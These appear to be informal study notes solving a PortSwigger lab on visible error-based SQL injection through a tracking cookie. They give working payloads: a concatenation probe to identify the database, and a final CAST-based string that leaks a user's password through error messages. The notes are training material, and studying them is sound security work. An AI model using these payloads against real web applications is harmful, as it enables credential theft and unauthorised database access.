https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

starting with the lab, adding a quote in the url does not cause any anomalous, but adding a single quote in tracking ID cooking indeed it does
An error is displayed:
```sql
SQL SELECT * FROM tracking WHERE id = 'a''
```

, first let's see if any operator cause an issue to determine what RDBMS is. As this payload
```cookie
xyz''foo'||'bar''
```
give us back a 200 we could assume it's an oracle or postgre as a RDBMS.
#### database permits casting?
The cast function is used to convert some kind of data type into a different one
```sql
CAST(expression AS target_data_type)
```
When th `expressions` isn't compatible with the `target_data_type` an revealing error is throwed
Let's use casta as a payload
**`CAST((SELECT 1) AS int)`**:
- **`SELECT 1`** is a subquery that simply returns the integer `1`.
- **`CAST(... AS int)`** is casting the result of the subquery (`1`) as an integer type.
- Since `1` is already an integer, this cast should succeed without errors.
but it will display an error saying that after an and must be a [[boolean]] expression, for this to work, just equalize all to 1, because we are comparating the whole function with a number, if cast succed it's because it's a number, so that means is true, when the error is throwed, it indicates that is not a number, so the condition is false. 
If we try `SELECT username from users` it will say something like there's an issue to reqtrieve more  tha one column, use limit 1 instead. 
```sql
SELECT password FROM users LIMIT 1
```
As our payload is getting truncated we should to eliminate the cookie
```sql
 AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
```

ANd the final resolution is:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
